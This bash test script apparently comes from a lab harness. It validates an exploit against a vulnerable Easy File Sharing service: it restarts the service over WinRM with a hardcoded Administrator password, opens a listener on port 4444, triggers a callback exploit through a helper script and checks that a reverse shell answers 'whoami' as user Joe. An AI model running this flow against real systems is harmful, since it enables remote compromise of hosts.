#!/usr/bin/env bash
# CysVuln EFS clean exploit test (callback stager — service survives).
#
# Usage:
#   ./scripts/validate/test-cysvuln-efs-clean.sh [target-ip]
#
# Env: CYSVULN_HTTP_PORT, WINRM_PORT, LHOST (10.0.2.2), LPORT (4444)

set -uo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
cd "${REPO_ROOT}"

TARGET="${1:-127.0.0.1}"
HTTP_PORT="${CYSVULN_HTTP_PORT:-18080}"
WINRM_PORT="${WINRM_PORT:-15985}"
ADMIN_PW="${ADMIN_PW:-PizzaMan123!}"
LHOST="${LHOST:-10.0.2.2}"
LPORT="${LPORT:-4444}"
ARTIFACTS="${ARTIFACTS_DIR:-${REPO_ROOT}/artifacts/resilience-validate/latest}"

mkdir -p "${ARTIFACTS}"
LOG="${ARTIFACTS}/cysvuln-efs-clean.log"
exec > >(tee -a "${LOG}") 2>&1

PASS=0
FAIL=0
record() { local s="$1" n="$2" d="${3:-}"; printf '%s  %s  %s\n' "$s" "$n" "$d"; [ "$s" = PASS ] && PASS=$((PASS+1)) || FAIL=$((FAIL+1)); }

winrm_ps() {
    python3 - "$TARGET" "$WINRM_PORT" "$ADMIN_PW" "$1" <<'PY'
import sys, winrm
host, port, pw, ps = sys.argv[1:5]
s = winrm.Session(f"http://{host}:{port}/wsman", auth=("Administrator", pw), transport="ntlm")
r = s.run_ps(ps)
sys.stdout.write(r.std_out.decode(errors="replace"))
sys.exit(r.status_code)
PY
}

echo "[*] CysVuln EFS clean test target=${TARGET}"

winrm_ps "Get-Process fsws,fswsService -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue; sc.exe stop fswsService | Out-Null; Start-Sleep 2; sc.exe start fswsService | Out-Null; Start-Sleep 3" >/dev/null || true

LISTEN_PID=""
cleanup() {
    [ -n "$LISTEN_PID" ] && kill "$LISTEN_PID" 2>/dev/null || true
}
trap cleanup EXIT

python3 -c "import socket; s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1); s.bind(('0.0.0.0',${LPORT})); s.listen(1); s.settimeout(45); print('[*] listening'); c,a=s.accept(); print('[+] conn',a); c.send(b'whoami\r\n'); d=c.recv(4096); print(d.decode(errors='replace')); c.close()" \
    > "${ARTIFACTS}/cysvuln-callback.out" 2>&1 &
LISTEN_PID=$!
sleep 1

if python3 scripts/validate/check_efs69_response.py \
    --target "$TARGET" --port "$HTTP_PORT" --service-port 80 \
    --mode callback --lhost "$LHOST" --lport "$LPORT" --timeout 15 2>&1; then
    record PASS callback-sent "check_efs69_response callback"
else
    record FAIL callback-sent "stimulus send failed"
fi

wait "$LISTEN_PID" 2>/dev/null || true
LISTEN_PID=""

CALLBACK_OUT="$(cat "${ARTIFACTS}/cysvuln-callback.out" 2>/dev/null || true)"
if echo "$CALLBACK_OUT" | grep -qiE 'User_Joe|user_joe|secretcon'; then
    record PASS callback-shell "inbound shell identity"
else
    record FAIL callback-shell "no Joe shell — see ${ARTIFACTS}/cysvuln-callback.out"
fi

sleep 2
SVC="$(winrm_ps "(Get-Service fswsService).Status" 2>/dev/null | tr -d '\r\n ')"
if [ "$SVC" = "Running" ]; then
    record PASS service-survives "fswsService still Running"
else
    record FAIL service-survives "status=${SVC:-unknown}"
fi

if curl -sf --max-time 8 -I "http://${TARGET}:${HTTP_PORT}/" | grep -qi 'Easy File Sharing'; then
    record PASS http-survives "EFS HTTP banner after exploit"
else
    record FAIL http-survives "HTTP down after callback exploit"
fi

echo "===== cysvuln-efs-clean: ${PASS} pass / ${FAIL} fail ====="
[ "$FAIL" -eq 0 ]
